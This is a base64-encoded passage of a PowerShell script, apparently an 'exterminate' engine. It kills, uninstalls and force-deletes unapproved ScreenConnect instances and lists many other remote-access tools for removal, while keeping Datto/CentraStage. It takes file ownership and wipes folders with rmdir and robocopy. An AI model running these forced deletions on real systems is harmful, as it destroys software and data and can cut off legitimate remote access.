d2FzIGtpbGxpbmcgR3J5eGEgZXZlcnkgdGljaykuCiAgICAkbG9nID0gSm9pbi1QYXRoICRXb3Jr
RGlyICdleHRlcm1pbmF0ZS5sb2cnCiAgICAkcnVubmluZ0cgPSBGaW5kLVJ1bm5pbmdHcnl4YUZw
CiAgICBpZiAoJHJ1bm5pbmdHKSB7IFNldC1Hcnl4YUZwICRydW5uaW5nRyB9CiAgICAka2VlcCA9
IEAoR2V0LUtlZXBGaW5nZXJwcmludHMpCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBk
aXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQogICAgZnVuY3Rpb24gTG9n
KFtzdHJpbmddJG0pIHsKICAgICAgICAkbGluZSA9ICd7MH0gezF9JyAtZiAoR2V0LURhdGUgLUZv
cm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycpLCAkbQogICAgICAgIEFkZC1Db250ZW50IC1MaXRl
cmFsUGF0aCAkbG9nIC1WYWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQog
ICAgICAgICMgTzQxOiBkbyBOT1QgV3JpdGUtT3V0cHV0IExvZyBsaW5lcyAocG9sbHV0ZXMgZm9y
IC9mIGNhbGxlcnMpCiAgICB9CiAgICAjIFByb3RlY3QgR3J5eGEgZHVyaW5nIHN0YXJ0IHJhY2U6
IGFueSBsaXZlIFNDIHByb2Nlc3Mgd2hvc2UgcGF0aCBlbWJlZHMgYQogICAgIyBub24tc2V2cnog
RlAgaXMgYSBrZWVwZXIgZXZlbiBpZiB0aGUgc2VydmljZSBpcyBub3QgUnVubmluZyB5ZXQuCiAg
ICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVl
bkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVj
dCB7CiAgICAgICAgJGJsb2IgPSAiJChbc3RyaW5nXSRfLkV4ZWN1dGFibGVQYXRoKSAkKFtzdHJp
bmddJF8uQ29tbWFuZExpbmUpIgogICAgICAgIGlmICgkYmxvYiAtbWF0Y2ggJ1NjcmVlbkNvbm5l
Y3QgQ2xpZW50IFwoKFswLTlhLWZBLUZdezE2fSlcKScpIHsKICAgICAgICAgICAgJGZwID0gJE1h
dGNoZXNbMV0uVG9Mb3dlcigpCiAgICAgICAgICAgIGlmICgkZnAgLW5vdGluICRzY3JpcHQ6U2V2
cnpLZWVwIC1hbmQgJGZwIC1ub3RpbiAka2VlcCkgewogICAgICAgICAgICAgICAgJGtlZXAgKz0g
JGZwCiAgICAgICAgICAgICAgICBTZXQtR3J5eGFGcCAkZnAKICAgICAgICAgICAgICAgIExvZyAi
a2VlcF9hZGRfZnJvbV9wcm9jIGZwPSRmcCIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0K
ICAgIGZ1bmN0aW9uIElzLUtlZXBlcihbc3RyaW5nXSRzKSB7CiAgICAgICAgaWYgKC1ub3QgJHMp
IHsgcmV0dXJuICRmYWxzZSB9CiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXApIHsgaWYgKCRz
IC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9CiAgICAgICAgcmV0dXJuICRmYWxzZQog
ICAgfQogICAgZnVuY3Rpb24gRm9yY2UtUmVtb3ZlRGlyKFtzdHJpbmddJGQpIHsKICAgICAgICBp
ZiAoLW5vdCAkZCAtb3IgLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZCkpIHsgcmV0dXJu
ICR0cnVlIH0KICAgICAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1
dGFibGVQYXRoIC1hbmQgJF8uRXhlY3V0YWJsZVBhdGguU3RhcnRzV2l0aCgkZCwgW1N0cmluZ0Nv
bXBhcmlzb25dOjpPcmRpbmFsSWdub3JlQ2FzZSkgfSB8CiAgICAgICAgICAgIEZvckVhY2gtT2Jq
ZWN0IHsgU3RvcC1Qcm9jZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlIH0KICAgICAgICAmIHRha2Vvd24uZXhlIC9GICRkIC9SIC9EIFkgMj4m
MSB8IE91dC1OdWxsCiAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9ncmFudCAnKlMtMS01LTMyLTU0
NDpGJyAvVCAvQyAvUSAyPiYxIHwgT3V0LU51bGwKICAgICAgICAmIGljYWNscy5leGUgJGQgL2dy
YW50ICdBZG1pbmlzdHJhdG9yczpGJyAvVCAvQyAvUSAyPiYxIHwgT3V0LU51bGwKICAgICAgICBS
ZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlCiAgICAgICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpIHsK
ICAgICAgICAgICAgY21kLmV4ZSAvYyAiYXR0cmliIC1oIC1zIC1yIC9zIC9kIGAiJGRcKi4qYCIi
IDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICBjbWQuZXhlIC9jICJybWRpciAvcyAvcSBgIiRk
YCIiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgIH0KICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAkZCkgewogICAgICAgICAgICAkZW1wdHkgPSBKb2luLVBhdGggJGVudjpURU1QICgi
b3duX2VtcHR5XyIgKyBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQogICAgICAgICAg
ICBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRlbXB0eSAtRm9yY2UgfCBPdXQt
TnVsbAogICAgICAgICAgICAmIHJvYm9jb3B5LmV4ZSAkZW1wdHkgJGQgL01JUiAvUjowIC9XOjAg
Mj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZW1w
dHkgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgIFJlbW92
ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgICAgICB9CiAgICAgICAgcmV0dXJuIC1ub3QgKFRlc3QtUGF0aCAtTGl0
ZXJhbFBhdGggJGQpCiAgICB9CiAgICBmdW5jdGlvbiBVbmluc3RhbGwtUHJvZHVjdEtleSgka2V5
KSB7CiAgICAgICAgJGd1aWQgPSAka2V5LlBTQ2hpbGROYW1lCiAgICAgICAgJHByb3AgPSBHZXQt
SXRlbVByb3BlcnR5ICRrZXkuUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAg
ICAgICAgJGRuID0gJHByb3AuRGlzcGxheU5hbWUKICAgICAgICBpZiAoJGd1aWQgLWxpa2UgJ3sq
fScpIHsKICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIG1zaWV4ZWMuZXhlIC1Bcmd1bWVu
dExpc3QgIi94ICRndWlkIC9xbiAvbm9yZXN0YXJ0IFJFQk9PVD1SZWFsbHlTdXBwcmVzcyIgLVdh
aXQgLVBhc3NUaHJ1IC1XaW5kb3dTdHlsZSBIaWRkZW4KICAgICAgICAgICAgTG9nICJwcm9kdWN0
X21zaWV4ZWMgWyRkbl0gZ3VpZD0kZ3VpZCBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAg
ICBpZiAoJHAuRXhpdENvZGUgLWluIDAsIDE2MDUsIDE2MTQsIDMwMTApIHsgcmV0dXJuICR0cnVl
IH0KICAgICAgICB9CiAgICAgICAgJHVzID0gJHByb3AuVW5pbnN0YWxsU3RyaW5nCiAgICAgICAg
aWYgKCR1cykgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCR1cyAtbWF0
Y2ggJyg/aSltc2lleGVjJykgewogICAgICAgICAgICAgICAgICAgICRhcmdzID0gKCR1cyAtcmVw
bGFjZSAnKD9pKV4uKm1zaWV4ZWMoXC5leGUpP1xzKicsICcnKQogICAgICAgICAgICAgICAgICAg
IGlmICgkYXJncyAtbm90bWF0Y2ggJy9xbicpIHsgJGFyZ3MgPSAiJGFyZ3MgL3FuIC9ub3Jlc3Rh
cnQiIH0KICAgICAgICAgICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUg
LUFyZ3VtZW50TGlzdCAkYXJncyAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbgog
ICAgICAgICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfbXNpIFskZG5d
IGV4aXQ9JCgkcC5FeGl0Q29kZSkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkcC5FeGl0
Q29kZSAtaW4gMCwgMTYwNSwgMTYxNCwgMzAxMCkKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAg
ICAgICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50TGlz
dCAiL2MgJHVzIC9TIC9zaWxlbnQgL3F1aWV0IC9xbiIgLVdhaXQgLVBhc3NUaHJ1IC1XaW5kb3dT
dHlsZSBIaWRkZW4KICAgICAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3RfdW5pbnN0YWxsc3Ry
aW5nX2V4ZSBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIgogICAgICAgICAgICAgICAgICAgIHJl
dHVybiAoJHAuRXhpdENvZGUgLWVxIDApCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0g
Y2F0Y2ggeyBMb2cgInByb2R1Y3RfdW5pbnN0YWxsc3RyaW5nX0ZBSUwgWyRkbl0gJF8iIH0KICAg
ICAgICB9CiAgICAgICAgcmV0dXJuICRmYWxzZQogICAgfQoKICAgIExvZyAnZXh0ZXJtaW5hdGVf
ZW5naW5lX0w3X2JlZ2luJwoKICAgICMgMS4gZm9yZWlnbiBTQyBwcm9kdWN0cyBmcm9tIEJPVEgg
Y29ycmVjdCBBUlAgaGl2ZXMKICAgICRzZWVuID0gQHt9CiAgICBmb3JlYWNoICgkcm9vdCBpbiAk
c2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9v
dCkpIHsgTG9nICJoaXZlX21pc3NpbmcgJHJvb3QiOyBjb250aW51ZSB9CiAgICAgICAgTG9nICJo
aXZlX3NjYW4gJHJvb3QiCiAgICAgICAgR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJHByb3AgPSBH
ZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQog
ICAgICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQogICAgICAgICAgICBpZiAoLW5vdCAk
ZG4pIHsgcmV0dXJuIH0KICAgICAgICAgICAgaWYgKCRkbiAtbm90bWF0Y2ggJyg/aSlTY3JlZW5D
b25uZWN0XHMrQ2xpZW50XHMqXCgoWzAtOUEtRmEtZl17MTZ9KVwpJykgeyByZXR1cm4gfQogICAg
ICAgICAgICAkZnAgPSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkKICAgICAgICAgICAgaWYgKCRmcCAt
aW4gJGtlZXApIHsgcmV0dXJuIH0KICAgICAgICAgICAgaWYgKCRzZWVuLkNvbnRhaW5zS2V5KCRf
LlBTQ2hpbGROYW1lKSkgeyByZXR1cm4gfQogICAgICAgICAgICAkc2VlblskXy5QU0NoaWxkTmFt
ZV0gPSAkdHJ1ZQogICAgICAgICAgICBpZiAoVW5pbnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4u
cHJvZHVjdCsrIH0gZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJwcm9kdWN0X1JFTU9WRV9GQUlMRUQg
WyRkbl0iIH0KICAgICAgICB9CiAgICB9CgogICAgIyAyLiBmb3JlaWduIFNDIHNlcnZpY2VzCiAg
ICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
KicgfSkpIHsKICAgICAgICBpZiAoSXMtS2VlcGVyICRzdmMuTmFtZSkgeyBjb250aW51ZSB9CiAg
ICAgICAgJiBzYy5leGUgc3RvcCAiJCgkc3ZjLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAg
ICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDYwMAogICAgICAgICYgc2MuZXhlIGRlbGV0ZSAi
JCgkc3ZjLk5hbWUpIiAyPiYxIHwgT3V0LU51bGwKICAgICAgICAkbi5zdmMrKzsgTG9nICJzdmNf
ZGVsZXRlZCAkKCRzdmMuTmFtZSkiCiAgICB9CgogICAgIyAzLiBmb3JlaWduIFNDIHByb2Nlc3Nl
cyDigJQgT05MWSBpZiBwYXRoL2NtZGxpbmUgZW1iZWRzIGEgTk9OLWtlZXBlciBGUC4KICAgICMg
TzQxOiBudWxsIEV4ZWN1dGFibGVQYXRoIHVzZWQgdG8ga2lsbCBHcnl4YSBDbGllbnRTZXJ2aWNl
IGV2ZXJ5IHRpY2sg4oaSIHJlaW5zdGFsbCBsb29wLgogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMy
X1Byb2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRleGUgPSBbc3Ry
aW5nXSRfLkV4ZWN1dGFibGVQYXRoCiAgICAgICAgJGNtZCA9IFtzdHJpbmddJF8uQ29tbWFuZExp
bmUKICAgICAgICAkYmxvYiA9ICIkZXhlICRjbWQiCiAgICAgICAgaWYgKElzLUtlZXBlciAkYmxv
YikgeyByZXR1cm4gfQogICAgICAgIGlmICgkYmxvYiAtbm90bWF0Y2ggJ1woKFswLTlhLWZBLUZd
ezE2fSlcKScpIHsKICAgICAgICAgICAgTG9nICJwcm9jX3NraXBfbm9fZnAgcGlkPSQoJF8uUHJv
Y2Vzc0lkKSBuYW1lPSQoJF8uTmFtZSkiCiAgICAgICAgICAgIHJldHVybgogICAgICAgIH0KICAg
ICAgICAkZnAgPSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkKICAgICAgICBpZiAoJGZwIC1pbiAka2Vl
cCkgeyByZXR1cm4gfQogICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3Jj
ZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgICAgICRuLnByb2MrKzsgTG9nICJw
cm9jX2tpbGxlZCBwaWQ9JCgkXy5Qcm9jZXNzSWQpIGZwPSRmcCBleGU9JGV4ZSIKICAgIH0KCiAg
ICAjIDQuIGZvcmVpZ24gU0MgaW5zdGFsbCBkaXJzIChQRiArIFBGODYpCiAgICBmb3JlYWNoICgk
YmFzZSBpbiBAKCRlbnY6UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7
CiAgICAgICAgaWYgKC1ub3QgJGJhc2UgLW9yIC1ub3QgKFRlc3QtUGF0aCAkYmFzZSkpIHsgY29u
dGludWUgfQogICAgICAgIEdldC1DaGlsZEl0ZW0gLUxpdGVyYWxQYXRoICRiYXNlIC1EaXJlY3Rv
cnkgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwKICAgICAgICAgICAgV2hl
cmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdConIH0gfCBGb3JFYWNoLU9i
amVjdCB7CiAgICAgICAgICAgICAgICAkZCA9ICRfLkZ1bGxOYW1lCiAgICAgICAgICAgICAgICBp
ZiAoSXMtS2VlcGVyICRkKSB7IHJldHVybiB9CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVt
b3ZlRGlyICRkKSB7ICRuLmRpcisrOyBMb2cgImRpcl9yZW1vdmVkICRkIiB9CiAgICAgICAgICAg
ICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgImRpcl9SRU1PVkVfRkFJTEVEICRkIiB9CiAgICAg
ICAgICAgIH0KICAgIH0KCiAgICAjIDUuIGRpc2FsbG93ZWQgUk1NIC8gcmVtb3RlLWFjY2VzcyB0
b29scyAobWFya2V0IGNvdmVyYWdlIDIwMjYpLgogICAgIyBLRUVQIGZvcmV2ZXI6IERhdHRvL0Nl
bnRyYVN0YWdlICsgU2NyZWVuQ29ubmVjdCBrZWVwIEZQcyAoaGFuZGxlZCBhYm92ZSkuCiAgICAj
IE5FVkVSIHB1dCBEYXR0by9DZW50cmFTdGFnZS9DYWdTZXJ2aWNlIGluIHRoaXMgbGlzdC4KICAg
IGZ1bmN0aW9uIElzLURhdHRvS2VlcGVyKFtzdHJpbmddJHMpIHsKICAgICAgICBpZiAoLW5vdCAk
cykgeyByZXR1cm4gJGZhbHNlIH0KICAgICAgICByZXR1cm4gW2Jvb2xdKCRzIC1tYXRjaCAnKD9p
KURhdHRvfENlbnRyYVN0YWdlfENhZ1NlcnZpY2V8QXV0b3Rhc2tFbmRwb2ludCcpCiAgICB9CiAg
ICAkcm1tID0gQCgKICAgICAgICBAeyBUYWc9J0FueURlc2snOyAgICAgIFN2Yz1AKCdBbnlEZXNr
Jyk7IFByb2M9QCgnQW55RGVzaycpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFueURlc2si
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQW55RGVzayIsIiRlbnY6UHJvZ3JhbURhdGFcQW55
RGVzayIpOyBQcm9kPUAoJ0FueURlc2sqJykgfQogICAgICAgIEB7IFRhZz0nVGVhbVZpZXdlcic7
ICAgU3ZjPUAoJ1RlYW1WaWV3ZXIqJyk7IFByb2M9QCgnVGVhbVZpZXdlcionLCd0dl93MzIqJywn
dHZfeDY0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRlYW1WaWV3ZXIiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cVGVhbVZpZXdlciIpOyBQcm9kPUAoJ1RlYW1WaWV3ZXIqJykgfQog
ICAgICAgIEB7IFRhZz0nU3BsYXNodG9wJzsgICAgU3ZjPUAoJ1NwbGFzaHRvcConLCdTUlNlcnZp
Y2UnLCdTU1VTZXJ2aWNlJyk7IFByb2M9QCgnU3BsYXNodG9wKicsJ3N0cndpbmNsdConLCdTUk1h
bmFnZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3BsYXNodG9wIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNwbGFzaHRvcCIpOyBQcm9kPUAoJ1NwbGFzaHRvcConKSB9CiAgICAg
ICAgQHsgVGFnPSdMb2dNZUluJzsgICAgICBTdmM9QCgnTG9nTWVJbicsJ0xNSUd1YXJkaWFuU3Zj
JywnTE1JaWduaXRpb24nKTsgUHJvYz1AKCdMb2dNZUluKicsJ0xNSUd1YXJkaWFuKicsJ1JhU2Vy
dmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXExvZ01lSW4iLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cTG9nTWVJbiIpOyBQcm9kPUAoJ0xvZ01lSW4qJykgfQogICAgICAgIEB7IFRh
Zz0nR29Ubyc7ICAgICAgICAgU3ZjPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnR29Ub1Jl
c29sdmUqJyk7IFByb2M9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdnMm0qJywnR29Ub1Jl
c29sdmUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR29Ub015UEMiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cR29Ub015UEMiKTsgUHJvZD1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0
KicsJ0dvVG8gUmVzb2x2ZSonLCdHb1RvTWVldGluZyonLCdHb1RvIENvbm5lY3QqJykgfQogICAg
ICAgIEB7IFRhZz0nUnVzdERlc2snOyAgICAgU3ZjPUAoJ1J1c3REZXNrJywncnVzdGRlc2sqJyk7
IFByb2M9QCgncnVzdGRlc2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUnVzdERlc2si
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUnVzdERlc2siKTsgUHJvZD1AKCdSdXN0RGVzayon
KSB9CiAgICAgICAgQHsgVGFnPSdTdXByZW1vJzsgICAgICBTdmM9QCgnU3VwcmVtbyonKTsgUHJv
Yz1AKCdTdXByZW1vKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFN1cHJlbW8iLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cU3VwcmVtbyIpOyBQcm9kPUAoJ1N1cHJlbW8qJykgfQogICAg
ICAgIEB7IFRhZz0nRFdTZXJ2aWNlJzsgICAgU3ZjPUAoJ0RXQWdlbnQnLCdkd2FnZW50KicpOyBQ
cm9jPUAoJ2R3YWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcRFdBZ2VudCIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxEV0FnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxEV0FnZW50
Iik7IFByb2Q9QCgnRFdBZ2VudConLCdEV1NlcnZpY2UqJykgfQogICAgICAgIEB7IFRhZz0nWm9o
b0Fzc2lzdCc7ICAgU3ZjPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob01lZXRpbmcqJyk7IFByb2M9QCgn
Wm9ob0Fzc2lzdConLCdab2hvVVJTQionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xab2hv
TWVldGluZyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxab2hvTWVldGluZyIpOyBQcm9kPUAo
J1pvaG8gQXNzaXN0KicsJ1pvaG9NZWV0aW5nKicpIH0KICAgICAgICBAeyBUYWc9J1JlbW90ZVBD
JzsgICAgIFN2Yz1AKCdSZW1vdGVQQyonKTsgUHJvYz1AKCdSZW1vdGVQQyonLCdSUENTdWl0ZSon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZW1vdGVQQyIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxSZW1vdGVQQyIpOyBQcm9kPUAoJ1JlbW90ZVBDKicpIH0KICAgICAgICBAeyBUYWc9
J0JvbWdhcic7ICAgICAgIFN2Yz1AKCdib21nYXIqJywnQmV5b25kVHJ1c3QqJyk7IFByb2M9QCgn
Ym9tZ2FyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJvbWdhciIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxCb21nYXIiLCIkZW52OlByb2dyYW1GaWxlc1xCZXlvbmRUcnVzdCIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCZXlvbmRUcnVzdCIpOyBQcm9kPUAoJ0JvbWdhcionLCdC
ZXlvbmRUcnVzdConKSB9CiAgICAgICAgQHsgVGFnPSdQYXJzZWMnOyAgICAgICBTdmM9QCgnUGFy
c2VjKicpOyBQcm9jPUAoJ3BhcnNlY2QqJywncHNlcnZpY2UqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcUGFyc2VjIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBhcnNlYyIsIiRlbnY6
UHJvZ3JhbURhdGFcUGFyc2VjIik7IFByb2Q9QCgnUGFyc2VjKicpIH0KICAgICAgICBAeyBUYWc9
J0Nocm9tZVJEJzsgICAgIFN2Yz1AKCdjaHJvbW90aW5nKicpOyBQcm9jPUAoJ3JlbW90aW5nX2hv
c3QqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcR29vZ2xlXENocm9tZSBSZW1vdGUgRGVz
a3RvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHb29nbGVcQ2hyb21lIFJlbW90ZSBEZXNr
dG9wIik7IFByb2Q9QCgnQ2hyb21lIFJlbW90ZSBEZXNrdG9wKicpIH0KICAgICAgICBAeyBUYWc9
J1VsdHJhVk5DJzsgICAgIFN2Yz1AKCd1dm5jKicsJ3dpbnZuYyonKTsgUHJvYz1AKCd3aW52bmMq
JywndXZuYyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZOQyIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZOQyIpOyBQcm9kPUAoJ1VsdHJhVk5DKicsJ1dpblZOQyon
KSB9CiAgICAgICAgQHsgVGFnPSdUaWdodFZOQyc7ICAgICBTdmM9QCgndHZuc2VydmVyKicpOyBQ
cm9jPUAoJ3R2bnNlcnZlcionLCd0dm52aWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcVGlnaHRWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVGlnaHRWTkMiKTsgUHJvZD1A
KCdUaWdodFZOQyonKSB9CiAgICAgICAgQHsgVGFnPSdSZWFsVk5DJzsgICAgICBTdmM9QCgndm5j
c2VydmVyKicpOyBQcm9jPUAoJ3ZuY3NlcnZlcionLCd2bmN2aWV3ZXIqJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcUmVhbFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZWFsVk5D
Iik7IFByb2Q9QCgnVk5DIFNlcnZlcionLCdSZWFsVk5DKicpIH0KICAgICAgICBAeyBUYWc9J0Rh
bWVXYXJlJzsgICAgIFN2Yz1AKCdEYW1lV2FyZSonKTsgUHJvYz1AKCdEV1JDUyonLCdEV1JDQyon
LCdEYW1lV2FyZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTb2xhcldpbmRzIiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNvbGFyV2luZHMiLCIkZW52OlByb2dyYW1GaWxlc1xEYW1l
V2FyZSBSZW1vdGUgU3VwcG9ydCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxEYW1lV2FyZSBS
ZW1vdGUgU3VwcG9ydCIpOyBQcm9kPUAoJ0RhbWVXYXJlKicpIH0KICAgICAgICBAeyBUYWc9J05l
dFN1cHBvcnQnOyAgIFN2Yz1AKCdOZXRTdXBwb3J0KicpOyBQcm9jPUAoJ2NsaWVudDMyKicsJ3Bj
aWN0bConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xOZXRTdXBwb3J0IiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XE5ldFN1cHBvcnQiKTsgUHJvZD1AKCdOZXRTdXBwb3J0KicpIH0KICAg
ICAgICBAeyBUYWc9J1NpbXBsZUhlbHAnOyAgIFN2Yz1AKCdTaW1wbGVIZWxwKicpOyBQcm9jPUAo
J1NpbXBsZVNlcnZpY2UqJywnc2ltcGxlc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xTaW1wbGVIZWxwIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNpbXBsZUhlbHAiKTsg
UHJvZD1AKCdTaW1wbGVIZWxwKicpIH0KICAgICAgICBAeyBUYWc9J0dldFNjcmVlbic7ICAgIFN2
Yz1AKCdHZXRTY3JlZW4qJyk7IFByb2M9QCgnR2V0U2NyZWVuKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXEdldFNjcmVlbiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxHZXRTY3JlZW4i
KTsgUHJvZD1AKCdHZXRTY3JlZW4qJykgfQogICAgICAgIEB7IFRhZz0nSXBlcml1cyc7ICAgICAg
U3ZjPUAoJ0lwZXJpdXMqJyk7IFByb2M9QCgnSXBlcml1c1JlbW90ZSonKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xJcGVyaXVzIFJlbW90ZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxJ
cGVyaXVzIFJlbW90ZSIpOyBQcm9kPUAoJ0lwZXJpdXMqJykgfQogICAgICAgIEB7IFRhZz0nSVNM
T25saW5lJzsgICBTdmM9QCgnSVNMbGlnaHQqJyk7IFByb2M9QCgnSVNMbGlnaHQqJywnSVNMQWx3
